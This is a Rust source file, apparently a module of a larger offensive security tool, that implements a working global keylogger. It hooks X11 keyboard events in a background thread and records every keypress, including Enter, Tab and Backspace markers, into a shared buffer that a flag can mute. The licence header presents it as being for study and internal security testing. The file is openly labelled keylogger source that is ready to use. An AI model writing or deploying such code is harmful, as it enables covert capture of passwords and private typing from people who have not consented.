/*
Copyright (c) 2026 José María Micoli
Licensed under {'license_type': 'AGPLv3'}

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
*/

use rdev::{listen, EventType};
use std::sync::{Arc, Mutex, atomic::{AtomicBool, Ordering}};
use std::thread;

pub struct Keylogger {
    pub buffer: Arc<Mutex<String>>,
    pub is_running: Arc<AtomicBool>,
}

impl Keylogger {
    /// Receives the global state references from main.rs
    pub fn new(buffer: Arc<Mutex<String>>, is_running: Arc<AtomicBool>) -> Self {
        Self {
            buffer,
            is_running,
        }
    }

    pub fn start(&self) {
        // Avoid spawning multiple threads if already active
        let buffer_clone = Arc::clone(&self.buffer);
        let running_clone = Arc::clone(&self.is_running);

        thread::spawn(move || {
            // listen is blocking and hooks into X11. 
            // It will run for the life of the process.
            if let Err(error) = listen(move |event| {
                // Check the atomic toggle before recording anything
                if running_clone.load(Ordering::SeqCst) {
                    if let EventType::KeyPress(_key) = event.event_type {
                        let mut buf = buffer_clone.lock().unwrap();
                        
                        // Use event.name for smart character mapping (Shift, Caps, etc.)
                        if let Some(name) = event.name {
                            buf.push_str(&name);
                        } else {
                            // Fallback for special keys that event.name might miss
                            let key_debug = format!("{:?}", _key);
                            match key_debug.as_str() {
                                "Return" => buf.push_str("\n[ENT]\n"),
                                "Space" => buf.push_str(" "),
                                "Tab" => buf.push_str("\t"),
                                "Backspace" => buf.push_str("[BK]"),
                                _ => {} 
                            }
                        }
                    }
                }
            }) {
                eprintln!("Keylogger Runtime Error: {:?}", error);
            }
        });
    }

    /// Explicitly mutes the keylogger. 
    /// The thread stays alive but stops capturing input.
    pub fn stop(&self) {
        self.is_running.store(false, Ordering::SeqCst);
        println!(">> [INTERNAL] Keylogger Muted.");
    }
}